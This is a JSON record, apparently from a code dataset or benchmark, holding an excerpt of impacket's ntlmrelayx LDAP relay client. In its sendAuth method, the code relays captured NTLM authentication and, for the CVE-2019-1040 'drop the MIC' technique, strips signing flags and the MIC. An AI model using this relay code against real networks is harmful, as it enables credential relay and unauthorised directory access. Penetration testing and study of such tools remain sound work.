{
    "case_id": "case-1062",
    "repo_name": "fortra/impacket",
    "file_path": "impacket/examples/ntlmrelayx/clients/ldaprelayclient.py",
    "code_snippet": "    #This is a fake function for ldap3 which wants an NTLM client with specific methods\n    def create_negotiate_message(self):\n        return self.negotiateMessage\n\n    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):\n        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:\n            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)\n            token = respToken2['ResponseToken']\n        else:\n            token = authenticateMessageBlob\n\n        authMessage = NTLMAuthChallengeResponse()\n        authMessage.fromString(token)\n        # When exploiting CVE-2019-1040, remove flags\n        if self.serverConfig.remove_mic:\n            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:\n                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN\n            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:\n                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN\n            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:\n                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH\n            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:\n                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION\n            authMessage['MIC'] = b''\n            authMessage['MICLen'] = 0\n            authMessage['Version'] = b''\n            authMessage['VersionLen'] = 0\n            token = authMessage.getData()\n\n        with self.session.connection_lock:\n            self.authenticateMessageBlob = token\n            request = bind.bind_operation(self.session.version, 'SICILY_RESPONSE_NTLM', self, None)\n            response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))\n            result = response[0]\n        self.session.sasl_in_progress = False\n\n        if result['result'] == RESULT_SUCCESS:\n            self.session.bound = True\n            self.session.refresh_server_info()\n            return None, STATUS_SUCCESS\n        else:\n",
    "line_range": [
        106,
        147
    ],
    "command_specific_fields": {
        "method_name": "sendAuth"
    },
    "language": "python",
    "commit": "6d8dd858e1f9877ffe10b34afd67742a6de242f0",
    "prompt": ""
}